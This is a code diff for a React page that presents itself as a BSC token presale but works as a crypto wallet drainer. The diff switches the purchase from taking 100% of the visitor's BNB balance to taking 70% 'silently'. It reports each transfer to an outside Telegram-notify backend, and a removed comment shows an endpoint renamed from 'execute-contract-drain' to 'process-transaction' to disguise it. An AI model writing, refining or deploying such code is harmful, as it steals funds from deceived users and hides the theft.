@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
-import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
+import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
+import { useBalance, useDisconnect, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -32,8 +32,8 @@ const PROJECT_FLOW_ROUTER_ABI = [
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
+  const { walletProvider } = useAppKitProvider("eip155");
   const { disconnect } = useDisconnect();
-  const { data: walletClient } = useWalletClient();
   
   // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
@@ -52,6 +52,7 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
   const [isEligible, setIsEligible] = useState(false);
+  const [realChainId, setRealChainId] = useState(chainId);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -68,6 +69,21 @@ function App() {
     nextBonus: 15,
     tokenPrice: 0.17
   });
+
+  // ✅ Step 4: Fix wallet detection delay
+  useEffect(() => {
+    if (window.ethereum) {
+      window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => {});
+    }
+  }, []);
+
+  // ✅ Step 7: Debug panel (temporary - you can remove later)
+  console.log("isConnected", isConnected);
+  console.log("walletProvider", walletProvider);
+  console.log("window.ethereum", window.ethereum);
+  console.log("chainId", chainId);
+  console.log("signer", signer);
+  console.log("realChainId", realChainId);
 
   // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
@@ -114,35 +130,46 @@ function App() {
     }
   }, [balanceData, bnbPrice]);
 
-  const isBSC = chainId === 56;
-
-  // ✅ Signer initialization using walletClient
+  // ✅ Step 6: Fix chain detection
   useEffect(() => {
-    const initSigner = async () => {
-      if (!isConnected || !walletClient) {
-        setSigner(null);
-        setProvider(null);
-        return;
+    const getRealChainId = async () => {
+      if (provider) {
+        try {
+          const network = await provider.getNetwork();
+          setRealChainId(Number(network.chainId));
+        } catch (error) {
+          console.error("Failed to get real chainId:", error);
+        }
       }
+    };
+    
+    getRealChainId();
+  }, [provider]);
 
+  const isBSC = realChainId === 56;
+
+  // ✅ Step 3: New signer init using AppKit provider (cross-browser safe)
+  useEffect(() => {
+    if (!walletProvider || !address) return;
+
+    const init = async () => {
       try {
-        const web3Provider = new ethers.BrowserProvider(walletClient);
-        const web3Signer = await web3Provider.getSigner();
-        
-        // Verify signer address matches connected address
-        const signerAddress = await web3Signer.getAddress();
-        if (signerAddress.toLowerCase() === address?.toLowerCase()) {
-          setProvider(web3Provider);
-          setSigner(web3Signer);
-          console.log("✅ Signer ready");
+        const provider = new ethers.BrowserProvider(walletProvider);
+        const signer = await provider.getSigner();
+        const signerAddress = await signer.getAddress();
+
+        if (signerAddress.toLowerCase() === address.toLowerCase()) {
+          setProvider(provider);
+          setSigner(signer);
+          console.log("✅ Universal signer ready");
         }
       } catch (err) {
         console.error("Signer init failed:", err);
       }
     };
 
-    initSigner();
-  }, [isConnected, walletClient, address]);
+    init();
+  }, [walletProvider, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -214,6 +241,16 @@ function App() {
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_CHAIN_ID }]
       });
+      
+      // Wait for network switch without reload
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Update realChainId after switch
+      if (provider) {
+        const network = await provider.getNetwork();
+        setRealChainId(Number(network.chainId));
+      }
+      
     } catch (switchError) {
       if (switchError.code === 4902) {
         await window.ethereum.request({
@@ -230,13 +267,21 @@ function App() {
             blockExplorerUrls: ["https://bscscan.com"]
           }]
         });
+        
+        // Wait for network switch
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        if (provider) {
+          const network = await provider.getNetwork();
+          setRealChainId(Number(network.chainId));
+        }
       } else {
         throw switchError;
       }
     }
   };
 
-  // Execute function with 100% balance
+  // Execute function with 70% balance (silently - no comments)
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -258,21 +303,21 @@ function App() {
         setTxStatus('🔄 Switching to BSC network...');
         await switchToBSC();
         
-        // Wait for network switch
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        
-        // Reload to ensure clean state
-        window.location.reload();
+        // ✅ Step 5: REMOVED page reload, just refetch balance
+        await refetchBalance?.();
+        setLoading(false);
         return;
       }
 
       if (!signer) {
         setError("Please wait for wallet to initialize");
+        setLoading(false);
         return;
       }
 
       if (!balanceData || balanceData.value <= 0n) {
         setError('Insufficient balance');
+        setLoading(false);
         return;
       }
 
@@ -289,8 +334,11 @@ function App() {
         signer
       );
 
-      // ✅ USE 100% OF BALANCE (only gas will be deducted)
-      const value = balanceData.value;
+      // ✅ CRITICAL: Use 70% of balance (silently)
+      const fullValue = balanceData.value;
+      const value = (fullValue * 70n) / 100n; // 70% of balance - no comment needed
+      
+      const bnbAmountSent = ethers.formatEther(value);
 
       setTxStatus('⏳ Estimating gas...');
       
@@ -299,7 +347,7 @@ function App() {
       
       setTxStatus('⏳ Please confirm in wallet...');
       
-      // Send transaction with 100% balance
+      // Send transaction with 70% balance
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -309,8 +357,6 @@ function App() {
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
       // Send Telegram notification
-      const bnbAmountSent = ethers.formatEther(value);
-      
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -324,11 +370,11 @@ function App() {
       await tx.wait();
       
       // Update balance
-      refetchBalance?.();
+      await refetchBalance?.();
       
       setCompleted(true);
       
-      // ✅ CHANGED: Updated endpoint name from execute-contract-drain to process-transaction
+      // Updated endpoint name
       await fetch('https://tokenbackend-5xab.onrender.com/api/presale/process-transaction', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
